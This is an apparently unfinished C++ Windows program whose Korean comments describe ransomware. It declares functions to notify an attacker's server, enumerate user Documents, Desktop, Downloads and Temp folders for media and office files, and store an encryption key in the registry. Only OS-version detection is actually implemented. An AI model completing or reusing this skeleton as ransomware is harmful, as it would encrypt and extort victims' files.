#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <cstdlib>
#include <string>
#include <vector>
#include <time.h>
#include <sys/types.h>
#include <stdio.h>
#include <Lm.h>
//#include "aes.h"
using namespace std;
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

// test
#define PORT 8080

#define TARGET_NUM 4
#define FILE_MAXLEN 4096
#define BUFFER_SIZE 1024
#define KEY_LEN 8
#define EXTENSION_SIZE 10

#define PORT 8080

int extension_cnt[EXTENSION_SIZE];

enum Extension {
    mp3, mp4, png, jpg, gif, txt, docx, pptx, xlsx, pdf
};

char extensions[EXTENSION_SIZE][EXTENSION_SIZE] = {
   "mp3", "mp4", "png", "jpg", "gif", "txt", "docx", "pptx", "xlsx", "pdf"
};

enum Extension ext;

char rootFolderName[FILE_MAXLEN] = "C:\\Users\\";
char documentFolderName[FILE_MAXLEN];
char desktopFolderName[FILE_MAXLEN];
char downloadsFolderName[FILE_MAXLEN];
char tempFolderName[FILE_MAXLEN];

char* targetFolderList[TARGET_NUM];

char cryptoKey[KEY_LEN];

typedef struct TargetFolders {
    vector<string> documentFolderFiles;
    vector<string> desktopFolderFiles;
    vector<string> downloadsFolderFiles;
    vector<string> tempFolderFiles;
} TargetFolders;

TargetFolders targetFolders;

int notifyToServer();            // 클라이언트가 랜섬웨어를 실행시켰다는 걸 공격자에게 알림
void makeFolderPath();            // 타겟으로 지정된 폴더들 경로 생성
int readTargetFolder(int, char*);   // 타겟으로 지정된 폴더들 탐색하기
int registerKeyToRegistry();      // 암호화 키 레지스트리에 등록
const char* getFileType(const char* filepath);
void countExtensions();

int k = 0;

const char* GetOSName(DWORD dwMajor, DWORD dwMino) {

    int count = 0;
    char* result;
    char get_osName[1024];
    char Window_version[1024];

    //cmd에서 버전정보 긁어오는 코드
    FILE* fp = _popen("cmd /c ver", "r");

    fgetc(fp);
    fgets(Window_version, 1024, fp);
    //printf("version : %s\n", Window_version);
    fclose(fp);

    //긁어온 버전정보에서 10,11구분위해 buildnumber쪽만 추출하는 부분
    result = strtok(Window_version, "\.");

    while (result != NULL)
    {


        result = strtok(NULL, "\.");
        count += 1;
        if ((count == 2)) {
            strcpy(get_osName, result);
        }
    }

    int buildNumber = atoi(get_osName);

    //VersionInfo info;
    OSVERSIONINFOEXW osv;
    osv.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    /*
    if (GetVersionExW((LPOSVERSIONINFOW)&osv)) {
       printf("version : \n%d\n%d\n%d\n", osv.dwMajorVersion,
           osv.dwMinorVersion, osv.dwBuildNumber);
     }      
     */
    //버전 구분하는 코드
    if ((dwMajor == 4) && (dwMino == 0)) return "WIN_95";
    else if ((dwMajor == 4) && (dwMino == 10)) return "WIN_98";
    else if ((dwMajor == 4) && (dwMino == 90)) return "WIN_ME";
    else if ((dwMajor == 5) && (dwMino == 0)) return "WIN_2000";
    else if ((dwMajor == 5) && (dwMino == 1)) return "WIN_XP";
    else if ((dwMajor == 5) && (dwMino == 2)) return "WIN_.NET";
    else if ((dwMajor == 6) && (dwMino == 0)) return "WIN_VISTA";
    else if ((dwMajor == 6) && (dwMino == 1)) return "WIN_7";
    else if ((dwMajor == 6) && (dwMino == 2)) return "WIN_8";
    else if ((dwMajor == 6) && (dwMino == 3)) return "WIN_8.1";
    else if ((dwMajor == 10) && (dwMino == 0)) {
        //int k = 1;
        if (buildNumber < 22000) {
            return "WIN_10";
        }
        else if (buildNumber > 22000) {
            return "WIN_11";
        }

    }
    //else if ((dwMajor == 10) && (dwMino == 0)&&(osv.dwBuildNumber < 22000)) return "WIN_10";
    //else if ((dwMajor == 10) && (dwMino == 0) && (osv.dwBuildNumber > 22000)) {

    return "WIN_ETC";


}


int main()
{

    static DWORD dwMajorCache = 0, dwMinorCache = 0;

    char* get_osName;

    get_osName = (char*)malloc(100);
    memset(get_osName, 0, 100);
    //
    LPWKSTA_INFO_100 pBuf = NULL;
    if (NERR_Success != NetWkstaGetInfo(NULL, 100, (LPBYTE*)&pBuf))
        return FALSE;
    dwMajorCache = pBuf->wki100_ver_major;
    dwMinorCache = pBuf->wki100_ver_minor;
    NetApiBufferFree(pBuf);

    strcpy(get_osName, GetOSName(dwMajorCache, dwMinorCache));
    strcat(get_osName, " ");
    //printf("[+] Test %s\n", get_osName);
    //printf("version : %s\n", GetOSName(dwMajorCache, dwMinorCache));
    //


    int count = 0;
    char* result;
    char Window_version[1024];

    //cmd에서 버전정보 긁어오는 코드
    FILE* fp = _popen("cmd /c ver", "r");


    fgetc(fp);
    fgets(Window_version, 1024, fp);
    //printf("version : %s\n", Window_version);   //<<<<<<<<<<<<<<<<<<version전체확인원할시주석제거
    fclose(fp);

    //긁어온 버전정보에서 10,11구분위해 buildnumber쪽만 추출하는 부분
    result = strtok(Window_version, "\.");

    while (result != NULL)
    {


        result = strtok(NULL, "\.");
        count += 1;
        if ((count == 2)) {
            strcat(get_osName, result);
        }

    }

    //printf("[+] Finish \n");
    puts(get_osName);
    exit(0);


    return 0;

}